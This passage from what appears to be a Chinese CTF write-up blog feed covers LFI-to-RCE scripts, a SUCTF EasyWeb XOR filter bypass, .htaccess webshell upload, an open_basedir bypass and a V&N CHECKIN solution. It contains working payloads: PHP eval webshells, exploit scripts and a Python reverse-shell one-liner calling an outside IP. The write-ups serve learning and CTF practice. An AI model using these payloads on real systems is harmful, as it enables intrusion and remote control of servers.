<span class="token operator">=</span> <span class="token string">'http://172.17.0.1:8080/dir.php?dir=/tmp/'</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span>data <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"php[a-zA-Z0-9]{1,}"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span><span class="token keyword">print</span> data<span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span>url3<span class="token operator">=</span><span class="token string">'http://192.168.68.119/index.php?file=/tmp/'</span><span class="token operator">+</span>datadata <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Qftm'</span><span class="token punctuation">:</span><span class="token string">"system('whoami');"</span><span class="token punctuation">}</span>r <span class="token operator">=</span>  requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url3<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>content</code></pre><p>Win exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#python version 2.7</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">import</span> refiles <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token string">'file'</span><span class="token punctuation">:</span> BytesIO<span class="token punctuation">(</span><span class="token string">'&lt;?php eval($_REQUEST[Qftm]);'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>url1 <span class="token operator">=</span> <span class="token string">'http://192.168.68.119/web/fi/index.php?file=php://filter/string.strip_tags/resource=index.php'</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url1<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>url2 <span class="token operator">=</span> <span class="token string">'http://192.168.68.119/web/fi/dir.php?dir=C:/Windows/'</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span>data <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>r<span class="token string">"php[a-zA-Z0-9]{1,}"</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span><span class="token keyword">print</span> data<span class="token keyword">print</span> <span class="token string">"++++++++++++++++++++++"</span>url3<span class="token operator">=</span><span class="token string">'http://192.168.68.119/web/fi/index.php?file=C:/Windows/'</span><span class="token operator">+</span>data<span class="token operator">+</span><span class="token string">'.tmp'</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Qftm'</span><span class="token punctuation">:</span><span class="token string">"system('whoami');"</span><span class="token punctuation">}</span>r <span class="token operator">=</span>  requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url3<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">print</span> r<span class="token punctuation">.</span>content</code></pre><p><strong>TIPS2</strong> </p><p>在没有dir.php的情况下进行暴力破解。其实就是fuzz啦，就不详细写了。</p><blockquote><p>参考：<a href="https://www.freebuf.com/column/235054.html" target="_blank" rel="noopener">https://www.freebuf.com/column/235054.html</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>RCE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LFI RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF WEB wp3</title>
    <link href="/2021/01/08/BUUCTFwp3/"/>
    <url>/2021/01/08/BUUCTFwp3/</url>
    
    <content type="html"><![CDATA[<h1 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h1><p>给了源码。进行审计。</p><a id="more"></a><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// webadmin will remove your upload file every 20 min!!!! </span>    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"upload/tmp_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span>False<span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//对长度做限制</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//不能有字母数字和一些字符</span><span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//重复字符不能多于12</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>思路就是调用get_flag(),进而上传shell。</p><p>先第一个条件，对字母数字的过滤一般都由异或、取反、自增这三种方式绕过。</p><p>但这个过滤了~，那么取反被pass；由于有长度限制，自增也不能用；</p><p>因此这里选择用异或。</p><pre class=" language-python"><code class="language-python">str_<span class="token operator">=</span> <span class="token string">'_GET'</span>str_<span class="token operator">=</span>list<span class="token punctuation">(</span>str_<span class="token punctuation">)</span>final<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> x <span class="token keyword">in</span> str_<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span><span class="token operator">~</span>ord<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    final<span class="token operator">+=</span>hex<span class="token punctuation">(</span><span class="token operator">~</span>ord<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str_<span class="token punctuation">)</span>final <span class="token operator">=</span> final<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span>final<span class="token operator">+=</span><span class="token string">'^'</span><span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    final<span class="token operator">+=</span>r<span class="token string">'%ff'</span><span class="token keyword">print</span><span class="token punctuation">(</span>final<span class="token punctuation">)</span></code></pre><p>payload</p><pre><code>?_=${%a0%b8%ba%ab^%ff%ff%ff%ff}{%ff}();&amp;%ff=phpinfo</code></pre><p>可以看到phpinfo已经被调出来了，那么get_flag函数也可以被调用了。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20210108180317587.png" srcset="/img/loading.gif" alt="image-20210108180317587"></p><p>另外disable_functions中过滤了一大堆函数，这个地方需要注意。看等下是否能bypass。(bypass失败)</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20210109011334468.png" srcset="/img/loading.gif" alt="image-20210109011334468"></p><p>看get_flag这里。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// webadmin will remove your upload file every 20 min!!!! </span>    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"upload/tmp_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//过滤ph</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span>False<span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//过滤&lt;?</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//要求图片文件</span>        <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//打印路径</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>随便上传一个文件，可以看到上传文件夹是/upload/tmp_…，这里面大概率也不会本身就存在php文件了。所以用.htaccess。</p><p>关于.htaccess tricks,参考：</p><blockquote><p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/11741348.html</a></p></blockquote><p>对于get_the_flag中的对&lt;?的过滤，由于&lt;script&gt;写法在PHP7后就失效了，而这里是php7.2；这里选择用伪协议读取base64编码后的shell。</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//shell.a</span><span class="token constant">GIF86A11</span> <span class="token comment" spellcheck="true">//图片头后补两个字符防止base64解析错误</span><span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>GIF89a11PD9waHAgZXZhbCgkX0dFVFsnc2hlbGwnXSk7Pz4<span class="token operator">=</span></code></pre><p>构造.htaccess</p><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//绕exif_imagetype()</span><span class="token shell-comment comment">#define test_width 16</span><span class="token shell-comment comment">#define test_height 7</span>AddType application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php <span class="token punctuation">.</span>aphp_value auto_append_file "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.base64-decode/resource=/var/www/html/upload/tmp_6ca083a10158bbd1e1d54a1f9ef33813/aaa.a"</span></code></pre><p>绕exif_imagetype原理：</p><blockquote><p>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。<br>在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br>XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。<br>也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：<br><code>#define test_width 16</code><br><code>#define test_height 7</code></p></blockquote><p>上传两个文件后，传下phpinfo测试一下。可以正常解析。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20210109010834066.png" srcset="/img/loading.gif" alt="image-20210109010834066"></p><p>但是需要注意的是open_basedir对目录访问做了限制。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20210108233824056.png" srcset="/img/loading.gif" alt="image-20210108233824056"></p><blockquote><p>参考：bypass open_basedir <a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a></p></blockquote><p>payload</p><pre><code>chdir(&#39;xxx&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&#39;/&#39;));</code></pre><p>得到flag文件名。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20210109013124340.png" srcset="/img/loading.gif" alt="image-20210109013124340"></p><p>读flag。</p><pre><code>?shell=chdir(%27aaa%27);ini_set(%27open_basedir%27,%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%27/%27);var_dump(readfile(%27/THis_Is_tHe_F14g%27));</code></pre><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20210109140446124.png" srcset="/img/loading.gif" alt="image-20210109140446124"></p><h1 id="V-amp-N2020-公开赛-CHECKIN"><a href="#V-amp-N2020-公开赛-CHECKIN" class="headerlink" title="[V&amp;N2020 公开赛]CHECKIN"></a>[V&amp;N2020 公开赛]CHECKIN</h1><p>进来给了源码，是flask。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token keyword">import</span> osapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>flag_file <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># flag = flag_file.read()</span><span class="token comment" spellcheck="true"># flag_file.close()</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true"># @app.route('/flag')</span><span class="token comment" spellcheck="true"># def flag():</span><span class="token comment" spellcheck="true">#     return flag</span><span class="token comment" spellcheck="true">## want flag? naive!</span><span class="token comment" spellcheck="true"># You will never find the thing you want:) I think</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm -f flag.txt"</span><span class="token punctuation">)</span>    exec_cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'c'</span><span class="token punctuation">)</span>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>exec_cmd<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"1"</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> open<span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span></code></pre><p>主要在shell路由这里。访问/shell时会删除flag.txt，下面给了个shell，但没回显。那就直接反弹shell。</p><pre><code>python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;172.16.131.185&#39;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/sh&#39;,&#39;-i&#39;]);&quot;</code></pre><p>进来了。</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20210109144437553.png" srcset="/img/loading.gif" alt="image-20210109144437553"></p><p>虽然文件被删掉了，但进程被存下了。去/proc/pid/fd里找。</p><p>手找了半天，看了别人的方法感觉自己好憨。</p><pre><code>cat /proc/*/fd/*</code></pre><p>得到flag</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20210109145626780.png" srcset="/img/loading.gif" alt="image-20210109145626780"></p><h1 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h1><p>进来是三个跳转界面，点第三个显示源码。（此题前提知道flag在/flag下）</p><p><img src="//dddwmr.github.io/2021/01/08/BUUCTFwp3/image-20210109172713381.png" srcset="/img/loading.gif" alt="image-20210109172713381"></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token comment" spellcheck="true">// no path traversal</span>    <span class="token string">'\.\.'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// no stream wrapper</span>    <span class="token string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">// no data exfiltration</span>    <span class="token string">'flag'</span>  <span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/i'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input'); //获取post值</span><span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//json解码</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//body里不能有非法词</span>  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//读到的内容也不能有非法词</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// no data exfiltration!!!</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/HarekazeCTF\{.+\}/i'</span><span class="token punctuation">,</span> <span class="token string">'HarekazeCTF{&amp;lt;censored&amp;gt;}'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token 